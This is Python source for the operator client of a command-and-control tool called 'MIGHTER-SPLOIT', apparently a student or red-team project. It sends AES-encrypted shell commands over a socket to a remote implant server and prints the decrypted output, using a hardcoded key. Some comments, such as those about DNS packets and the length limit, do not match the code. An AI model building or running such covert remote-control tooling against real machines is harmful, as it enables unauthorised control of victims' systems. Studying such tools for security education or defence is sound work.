import socket, subprocess, os, time, sys, codecs, pyaes

def runClient(HOST,PORT):
    PKT_SIZE = 1024

    s = socket.socket()  # instantiate
    s.connect((HOST, PORT))  # connect to the server

    #user_input = "connected"  # initial input (**change to a proper packet saying connected**)
    while True:
        
        ##grab user input
        user_input = input('MS-C2> ')

        ##check for 'exit' command
        if (user_input.strip() == 'exit'):
            break

        ##pack the user input
        packet, err = packInput(user_input)
        #handle errors
        if (err == 1):
            #user_input length error
            print("user input length error")
            continue
        elif (err == 2):
            #encryption error
            print("user input encryption error")
            continue
        elif (err == 3):
            #decryption error
            print("user input decryption error")
            continue
        elif (err == 4):
            #packet crafting error
            print("user input packet crafting error")
            continue

        ##send the packet
        #s.send(packet.encode())
        s.send(packet)

        ##receive the server's response
        #recv_data = s.recv(PKT_SIZE).decode()
        recv_data = s.recv(PKT_SIZE)

        ##unpack message from data into recv_msg
        recv_msg, err = unpackData(recv_data)
        #handle errors
        if (err == 1):
            #unpacking error
            print("recv data unpacking error")
            continue
        elif (err == 2):
            #decryption error
            print("recv data decryption error")
            continue

        #DEBUGGING: print the 
        print("server said (enc):")
        print(str(recv_data))
        print("------------------------------------")
        print("server said (dec):")
        print(str(recv_msg)[2:-1].replace('\\n','\n'))

    s.shutdown(socket.SHUT_RD)
    s.close()  # close the connection

######################
#  Helper functions  #
######################

#def packInput(user_input)
#args: user_input - user provided command string
#returns: (packet, err) - DNS packet and error message
#   err = 0 ; no error
#       = 1 ; user_input length error
#       = 2 ; encryption error
#       = 3 ; decryption error
#       = 4 ; packet crafting error
def packInput(user_input):
    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
    packet = None
    err = 0

    ##user input sanitation
    safe_input = processInput(user_input)
    if(safe_input == None):
        err = 1
        return packet, err
    print(safe_input)
    ##encryption
    encrypted_safe_input = ""
    try:
        encrypted_safe_input = aes.encrypt(safe_input)
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass
    
    ##decryption test
    try:
        aes.decrypt(encrypted_safe_input)#.decode('utf-8')
    except Exception as e:
        err = 2
        return packet, err
    finally:
        pass

    ##craft packet
    packet = encrypted_safe_input

    #return packet
    return packet, err

#def unpackData(recv_data)
#args: recv_data - packet recieved from server
#returns: (recv_msg, err) - extracted plaintext message and error message
#   err = 0 ; no error
#       = 1 ; unpacking error
#       = 2 ; decryption error
def unpackData(recv_data):
    AES_KEY = "zMWYCRLd4szoBiPP".encode('utf-8')
    aes = pyaes.AESModeOfOperationCTR(AES_KEY) 
    recv_msg = None
    err = 0

    ##extract message packet
    encrypted_recv_msg = recv_data

    ##decrypt message
    try:
        recv_msg = aes.decrypt(encrypted_recv_msg)#.decode('utf-8')
    except Exception as e:
        err = 2
        return recv_msg, err
    finally:
        pass

    ##strip white space sanitation
    recv_msg = recv_msg.strip()    

    ##return message
    return recv_msg, err

#def processInput(user_input)
#args: user_input - raw input captured from cli
#returns: None if user_input is too long (>512 bytes)
#otherwise, user_input padded to a certain length with whitespace. 
def processInput(user_input):
    if(len(user_input) > 960):
        #command was too large
        return None
    return user_input

#def printSplash()
#just print that hacker splash...
def printSplash():
    ascii_splash = [
    "##############################################################################",
    "#                  ,-,-.                                                     #",
    "#                 ;,' `.:                                                    #",
    "#        _        : @ @ :                MIGHTER-SPLOIT C2 client            #",
    "#     ,-._)       :  L  ;                                                    #",
    "#    ,' <.\     ,-`.(=),'-.                                                  #",
    "#    \  /./\__,'\|`.`-','//`.                 Developed by:                  #",
    "#   `.>' |      :|>_`.' /::  :                      Sam Harris               #",
    "#         `----\"//;__[-]/  |  |                    Connor Moore              #",
    "#              ;/    : |_||  |                      Cam Harvey               #",
    "#              |     :    ;  ;                                               #",
    "#              ;`.___:__,'  ;                                                #",
    "#             ,'`._____;__,:                                                 #",
    "#           ,'_...----/ /.._\                                                #",
    "#         _;-'       =uu=    `._                                             #",
    "#       ,',  __,--.-----.-.__  .`.                                           #",
    "#     ,',',-'| _..|-----|._  |-.`.`.                                         #",
    "##############################################################################"]
    for elem in ascii_splash:
        print(elem)
    return


if __name__ == '__main__':
    if sys.version_info[0] != 3:
        print("This server requires Python 3")
        sys.exit(1)
    printSplash()
    HOST = "localhost" #"192.168.1.8"
    PORT = 1337 #52
    runClient(HOST,PORT)